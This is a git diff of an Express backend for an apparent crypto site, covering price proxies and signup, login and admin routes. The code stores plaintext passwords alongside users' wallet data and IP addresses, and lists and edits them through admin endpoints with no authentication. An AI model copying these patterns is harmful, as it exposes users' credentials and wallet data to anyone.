@@ -7,47 +7,32 @@ import { fileURLToPath } from 'url';
 
 dotenv.config();
 
-// Fix for __dirname in ES modules
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
-const port = process.env.PORT || 5001;
+const port = process.env.PORT || 5001; // Use 5001 for API, Vite on 5000
 const { Pool } = pg;
+
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: {
     rejectUnauthorized: false
   }
 });
-// Middlewares
+
 app.use(cors());
 app.use(express.json());
-app.use(express.static(path.join(__dirname,)));
-// Serve Frontend Files
-// Make sure your folder is actually named 'public' in the sidebar!
 
-
-// API Routes would go here (your pool.query stuff, etc.)
-
-// Symbol Mapping for CoinCap
+// ASSET_ID_MAP for CoinCap
 const ASSET_ID_MAP = {
-    'BTC': 'bitcoin',
-    'ETH': 'ethereum',
-    'SOL': 'solana',
-    'DOT': 'polkadot',
-    'USDT': 'tether',
-    'BNB': 'binance-coin',
-    'XRP': 'xrp',
-    'ADA': 'cardano',
-    'DOGE': 'dogecoin',
-    'MATIC': 'polygon',
-    'AVAX': 'avalanche',
-    'LINK': 'chainlink',
-    'KSM': 'kusama'
+    'BTC': 'bitcoin', 'ETH': 'ethereum', 'SOL': 'solana', 'DOT': 'polkadot',
+    'USDT': 'tether', 'BNB': 'binance-coin', 'XRP': 'xrp', 'ADA': 'cardano',
+    'DOGE': 'dogecoin', 'MATIC': 'polygon', 'AVAX': 'avalanche',
+    'LINK': 'chainlink', 'KSM': 'kusama'
 };
 
-// Create tables if they don't exist
+// Database Initialization
 pool.query(`
   CREATE TABLE IF NOT EXISTS users (
     id SERIAL PRIMARY KEY,
@@ -59,29 +44,10 @@ pool.query(`
   );
 `).catch(console.error);
 
-// Proxy for Market Prices (Multi-source fallback)
+// API: Market Prices
 app.get('/api/binance/prices', async (req, res) => {
   try {
-    // Attempt Bitfinex first
-    const response = await fetch('https://api-pub.bitfinex.com/v2/tickers?symbols=tBTCUSD,tETHUSD,tSOLUSD,tDOTUSD,tUSTUSD,tBNBUSD,tXRPUSD,tADAUSD,tDOGEUSD,tMATICUSD,tAVAXUSD,tLINKUSD,tKSMUSD');
-    if (response.ok) {
-      const data = await response.json();
-      const mapped = data.map(ticker => ({
-        symbol: ticker[0].replace('t', '').replace('USD', 'USDT').replace('UST', 'USDT'),
-        lastPrice: ticker[7],
-        priceChangePercent: ticker[6] * 100
-      }));
-      return res.json(mapped);
-    }
-  } catch (e) {
-    console.error('Bitfinex error:', e.message);
-  }
-
-  try {
-    // Fallback to CoinCap
-    const response = await fetch('https://api.coincap.io/v2/assets?limit=100', {
-      headers: { 'User-Agent': 'Mozilla/5.0' }
-    });
+    const response = await fetch('https://api.coincap.io/v2/assets?limit=100');
     if (response.ok) {
       const data = await response.json();
       const mapped = data.data.map(asset => ({
@@ -92,43 +58,26 @@ app.get('/api/binance/prices', async (req, res) => {
       return res.json(mapped);
     }
   } catch (e) {
-    console.error('CoinCap error:', e.message);
+    console.error('Price fetch error:', e.message);
   }
-  
   res.status(500).json({ error: 'Failed to fetch market data' });
 });
 
-// Proxy for Klines
+// API: Klines
 app.get('/api/binance/klines', async (req, res) => {
   try {
     const { symbol } = req.query;
-    const baseSymbol = symbol.replace('USDT', '');
-    const id = ASSET_ID_MAP[baseSymbol] || baseSymbol.toLowerCase();
-    
-    const response = await fetch(`https://api.coincap.io/v2/assets/${id}/history?interval=m15`, {
-      headers: { 'User-Agent': 'Mozilla/5.0' }
-    });
-    if (!response.ok) throw new Error(`CoinCap history error: ${response.status}`);
+    const id = ASSET_ID_MAP[symbol.replace('USDT', '')] || 'bitcoin';
+    const response = await fetch(`https://api.coincap.io/v2/assets/${id}/history?interval=m15`);
     const data = await response.json();
-    
-    const klines = data.data.map(d => [
-      parseInt(d.time), // Open time
-      d.priceUsd, // Open
-      d.priceUsd, // High
-      d.priceUsd, // Low
-      d.priceUsd, // Close
-      "0", // Volume
-      parseInt(d.time) + 900000, // Close time
-      "0", "0", "0", "0", "0"
-    ]);
+    const klines = data.data.map(d => [parseInt(d.time), d.priceUsd, d.priceUsd, d.priceUsd, d.priceUsd, "0", parseInt(d.time) + 900000]);
     res.json(klines);
   } catch (error) {
-    console.error(`Klines Error: ${error.message}`);
     res.status(500).json({ error: 'Failed to fetch klines' });
   }
 });
 
-// Auth Routes
+// API: Auth
 app.post('/api/auth/signup', async (req, res) => {
   const { email, password, walletData } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -137,15 +86,9 @@ app.post('/api/auth/signup', async (req, res) => {
       'INSERT INTO users (email, password, wallet_data, ip_address) VALUES ($1, $2, $3, $4) RETURNING *',
       [email, password, JSON.stringify(walletData), ip]
     );
-    
-    // Log verification for sandbox monitoring
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
-    console.log(`[VERIFICATION_DISPATCH] TARGET: ${email} | CODE: ${code}`);
-    
-    res.json({ success: true, user: result.rows[0], verificationSent: true });
+    res.json({ success: true, user: result.rows[0] });
   } catch (error) {
-    console.error('Signup error:', error);
-    res.status(500).json({ success: false, error: error.message || 'Auth error' });
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
@@ -157,16 +100,14 @@ app.post('/api/auth/login', async (req, res) => {
       'UPDATE users SET last_seen = CURRENT_TIMESTAMP, ip_address = $1 WHERE email = $2 AND password = $3 RETURNING *',
       [ip, email, password]
     );
-    if (result.rows.length > 0) {
-      res.json({ success: true, user: result.rows[0] });
-    } else {
-      res.status(401).json({ success: false, error: 'Invalid credentials' });
-    }
+    if (result.rows.length > 0) res.json({ success: true, user: result.rows[0] });
+    else res.status(401).json({ success: false, error: 'Invalid credentials' });
   } catch (error) {
-    res.status(500).json({ success: false, error: error.message || 'Auth error' });
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
+// API: Admin
 app.get('/api/admin/users', async (req, res) => {
   try {
     const result = await pool.query('SELECT id, email, wallet_data, last_seen, ip_address FROM users ORDER BY last_seen DESC NULLS LAST');
@@ -183,14 +124,9 @@ app.post('/api/admin/users/update', async (req, res) => {
     res.json({ success: true });
   } catch (error) {
     res.status(500).json({ error: error.message });
-  
-  });
-// The Catch-all (This MUST be below your API routes but above app.listen)
-app.get('*', (req, res) => {})
-  res.sendfile(join(__dirname, 'public',))
-        
-
+  }
+});
 
 app.listen(port, '0.0.0.0', () => {
-  console.log(`Backend running on port ${port}`);
+  console.log(`API Server running on port ${port}`);
 });
